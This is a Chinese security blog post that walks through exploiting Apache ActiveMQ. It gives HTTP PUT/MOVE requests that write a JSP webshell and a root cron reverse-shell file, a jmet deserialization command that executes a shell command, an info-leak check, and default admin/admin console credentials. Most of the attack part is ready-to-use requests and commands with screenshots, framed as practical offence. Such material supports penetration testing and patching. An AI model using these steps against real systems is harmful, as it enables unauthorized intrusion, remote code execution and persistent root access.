#  【攻防实战】ActiveMQ漏洞集锦   
原创 儒道易行  儒道易行   2025-06-01 12:01  
  
## ActiveMQ任意文件写入漏洞  
### 写入webshell  
  
写入webshell，需要写在admin或api应用中，都需要登录才能访问。  
  
默认的账号密码  
```
admin/admin

```  
  
首先访问  
```
http://x/admin/test/systemProperties.jsp

```  
  
查看ActiveMQ的绝对路径：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpxsmHbsgk4qFFQECSqj9icRq3a7Ja3fqjqCwb58VeQdTmdrsAm5jGZvuyBKvUYtkPB5yicV4cia3IPxg/640?wx_fmt=png&from=appmsg "")  
  
然后上传webshell：  
```
PUT /fileserver/2.txt HTTP/1.1


webshell

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpxsmHbsgk4qFFQECSqj9icRqdfRuiaJmwicerlHVAclMa5PIFEuk473Uut4wIttM5NN1zwd66Cz8zphg/640?wx_fmt=png&from=appmsg "")  
  
移动到web目录下的api文件夹中：  
```
MOVE /fileserver/2.txt HTTP/1.1
Destination: file:///opt/webapps/api/s.jsp

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpxsmHbsgk4qFFQECSqj9icRqic7rKoKnB9JrbqNjW1iaEzqGPnu2Iq5YK47tajq4shxTmyWq3PnqrpGA/640?wx_fmt=png&from=appmsg "")  
  
访问webshell（需要登录）：  
```
http://x/api/s.jsp?cmd=ls

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpxsmHbsgk4qFFQECSqj9icRq0qD8DyILLFVO7Gm4hNyTgMZ9CudVlT1wCADB62FYviau9W8Voh1GZ7Q/640?wx_fmt=png&from=appmsg "")  
### 写入crontab，自动化弹shell  
  
首先上传cron配置文件（注意，换行一定要\n  
，不能是\r\n  
，否则crontab执行会失败）：  
```
PUT /fileserver/1.txt HTTP/1.1

cron

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpxsmHbsgk4qFFQECSqj9icRq9Q0IYEEeyrjddwPDOFHyTD6LJCgGrN1WTkN88BgtwX6lkKwU1PmHfg/640?wx_fmt=png&from=appmsg "")  
  
将其移动到/etc/cron.d/root  
：  
```
MOVE /fileserver/1.txt HTTP/1.1
Destination: file:///etc/cron.d/root

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpxsmHbsgk4qFFQECSqj9icRqCyeOCj9hm8FhLMZUf80ibcLTNvqA79PRVKAxicQNU9obHqXoX5F0MaFA/640?wx_fmt=png&from=appmsg "")  
  
如果上述两个请求都返回204了，说明写入成功。等待反弹shell：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpxsmHbsgk4qFFQECSqj9icRq8RwmyWQ72xjqBJQKZ6rxgvw0cRTAWjjs3KG4zrXddGJjbIMtPzHPyw/640?wx_fmt=png&from=appmsg "")  
## ActiveMQ 反序列化漏洞  
### 实战  
  
执行：  
```
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/success" -Yp ROME x x

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpxsmHbsgk4qFFQECSqj9icRqmeLbqanmQ11soYOQN2qNcnLtf7vGSCXJLBjuahvw5ChZ4g9qPARoBQ/640?wx_fmt=png&from=appmsg "")  
  
此时会给目标ActiveMQ添加一个名为event的队列，我们可以通过  
```
http://x/admin/browse.jsp?JMSDestination=event

```  
  
看到这个队列中所有消息：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpxsmHbsgk4qFFQECSqj9icRq6t4fsc4x1aVOnycKkpIx7KPJkjbia4UDtgtmx6GRPD6VCUfibRBlJrjA/640?wx_fmt=png&from=appmsg "")  
  
点击进入该项目  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpxsmHbsgk4qFFQECSqj9icRqmfVg9lmLf99evJ6VuE0JoZZL2OPibP72xXcNiaINiaJLJrQjfKblPpO9g/640?wx_fmt=png&from=appmsg "")  
  
点击查看这条消息即可触发命令执行  
  
可见  
```
/tmp/success

```  
  
已成功创建，说明漏洞利用成功：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpxsmHbsgk4qFFQECSqj9icRq0iayBxjt3YibhPUMsFa7LwbW6ticbFlDryc0huWFZeZDXrC2UDwHCODMA/640?wx_fmt=png&from=appmsg "")  
## ActiveMQ 信息泄漏  
### 实战  
```
telnet x x

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpxsmHbsgk4qFFQECSqj9icRqFeiaicoicMwEcVjs5M8DpRicgEicDQfUJVica1sZSwIon4w3ZHjrVOoqh0Kw/640?wx_fmt=png&from=appmsg "")  
## ActiveMQ Console 存在默认弱口令  
### 实战  
  
Apache ActiveMQ 默认开启了控制台  
```
http://xxx/admin

```  
  
输入默认的账号密码  
```
admin/admin

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpxsmHbsgk4qFFQECSqj9icRq08Sq6ibJevYo76rTRJNHEGTXTU0sXeooxO41YzCAwjqzXDlicictClSGA/640?wx_fmt=png&from=appmsg "")  
  
登录成功  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpxsmHbsgk4qFFQECSqj9icRqBn3kBmjWXibCeicgCiczlFIgicWJGpaXv3E8SzX1xiauiaeNiadKuNuWTVDYA/640?wx_fmt=png&from=appmsg "")  
## 攻防交流群  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/v94hWOZcBpxsmHbsgk4qFFQECSqj9icRqfqsqdaQcum96BJHfoj4PDxAWSOh1z47H3RCBtUPEzmzjL4fM7dMSCA/640?wx_fmt=jpeg&from=appmsg "")  
## 声明  
  
文笔生疏，措辞浅薄，敬请各位大佬不吝赐教，万分感谢。  
  
免责声明：由于传播或利用此文所提供的信息、技术或方法而造成的任何直接或间接的后果及损失，均由使用者本人负责， 文章作者不为此承担任何责任。  
  
转载声明：儒道易行 拥有对此文章的修改和解释权，如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章的内容，不得以任何方式将其用于商业目的。  
  
